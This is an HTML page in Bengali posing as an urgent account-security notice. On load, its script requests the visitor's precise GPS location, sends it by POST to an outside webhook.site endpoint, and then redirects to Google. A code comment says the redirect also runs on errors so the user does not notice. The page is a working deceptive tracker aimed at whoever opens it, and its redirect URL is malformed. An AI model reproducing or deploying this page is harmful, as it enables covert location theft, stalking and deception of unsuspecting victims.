<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <title>জরুরি নোটিশ</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f9f9f9; }
        .container { max-width: 500px; margin: auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
        h2 { color: #d9534f; }
        p { color: #333; font-size: 16px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>সতর্কতা নোটিশ!</h2>
        <p>আপনার অ্যাকাউন্টের নিরাপত্তা ভেরিফিকেশনের জন্য নিচের পারমিশনটি অন করুন এবং পেজটি লোড হওয়া পর্যন্ত অপেক্ষা করুন।</p>
    </div>

    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, showError, {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                });
            } else {
                alert("আপনার ব্রাউজারটি জিপিএস সাপোর্ট করে না।");
            }
        };

        function sendLocation(position) {
            let lat = position.coords.latitude;
            let long = position.coords.longitude;
            let accuracy = position.coords.accuracy;
            
            let webhookURL = "https://webhook.site"; 

            let gpsData = {
                latitude: lat,
                longitude: long,
                accuracy: accuracy
            };

            // ফিক্সড: স্ট্যান্ডার্ড JSON POST রিকোয়েস্ট উইথ প্রপার হেডার
            fetch(webhookURL, {
                method: "POST",
                headers: { 
                    "Content-Type": "application/json" 
                },
                body: JSON.stringify(gpsData)
            }).then(() => {
                // ডাটা সাকসেসফুলি চলে যাওয়ার পর গুগল ম্যাপসে রিডাইরেক্ট হবে
                window.location.href = "https://google.com" + lat + "," + long;
            }).catch((err) => {
                // কোনো নেটওয়ার্ক এরর হলেও ইউজার যেন টের না পায়, সরাসরি ম্যাপসে পাঠিয়ে দেওয়া
                window.location.href = "https://google.com" + lat + "," + long;
            });
        }

        function showError(error) {
            if (error.code == error.PERMISSION_DENIED) {
                alert("অনুগ্রহ করে পেজটি দেখতে লোকেশন পারমিশন Allow করুন।");
            }
        }
    </script>
</body>
</html>
